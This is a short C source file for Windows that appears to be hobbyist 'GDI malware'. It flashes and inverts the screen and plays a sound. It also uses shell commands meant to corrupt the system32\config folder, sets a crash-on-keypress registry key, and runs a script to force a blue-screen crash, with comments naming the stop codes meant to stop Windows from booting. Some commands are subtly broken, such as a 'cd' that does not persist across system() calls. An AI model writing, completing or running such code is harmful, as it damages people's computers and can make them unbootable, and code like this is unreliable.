#include <stdlib.h>     // for system(); and rand();
#include <windows.h>   // for gdi screen glitches
#include <mmsystem.h> // didn't know how to synchronise, claude ai told me to do this
#pragma comment(lib, "winmm.lib") 

int main()
{
    srand(time(0)); // and this, because i don't want the same effects every time
    HDC hdc = GetDC(NULL);
    int bv = rand() % 2, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN); 
    system("cd C:\\Windows\\system32\\config");
    if (bv == 1)
    {
        system("echo 5=fuf7GhI^=^=S y s ^@ .B l u e s c r e e n^=^↓=3fdgh4c > OSDATA"); // for BAD_SYSTEM_CONFIG_INFO
    }
    else
    {
        system("mkdir OSDATA"); // for CONFIG_LIST_FAILED
    }
    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\kbdhid\\Parameters /v CrashOnCtrlScroll /d 1"); // for MANUALLY_INITIATED_CRASH(1)
    PlaySound(L".\\html5bytebeat.wav", NULL, SND_FILENAME | SND_ASYNC); // this is better than std::cout << "\a"; or Beep(freq, del); :) (claude told me to do this as well)
    for (int a = 0; a < 30; a++)
    {
        BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, hdc, w * h, bv, SRCCOPY); // glitch screen
        PatBlt(hdc, w, h, 1920, 1080, PATINVERT); // invert screen colour
        Sleep(1000); // wait for 1 second
    }
    ReleaseDC(NULL, hdc);
    system("cscript ctrlscrolllock.vbs //nologo"); // trigger bsod MANUALLY_INITIATED_CRASH(1) then BAD_SYSTEM_CONFIG_INFO or CONFIG_LIST_FAILED
    return 0;
}
